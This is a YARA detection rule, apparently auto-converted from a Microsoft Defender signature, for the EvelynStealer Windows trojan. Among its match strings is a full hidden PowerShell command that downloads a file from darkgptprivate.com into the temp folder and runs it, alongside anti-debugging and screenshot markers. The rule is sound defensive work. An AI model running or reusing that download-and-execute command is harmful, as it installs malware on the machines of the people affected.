rule Trojan_Win32_EvelynStealer_AB_2147962207_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/EvelynStealer.AB!MTB"
        threat_id = "2147962207"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "EvelynStealer"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://darkgptprivate.com/iknowyou.model' -OutFile $env:TEMP\\runtime.exe; Start-Process $env:TEMP\\runtime.exe" ascii //weight: 2
        $x_2_2 = "COOL_SCREENSHOT_MUTEX_YARRR" wide //weight: 2
        $x_2_3 = "_MakeScreenshotByCommand@4" ascii //weight: 2
        $x_2_4 = "IsDebuggerPresent" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

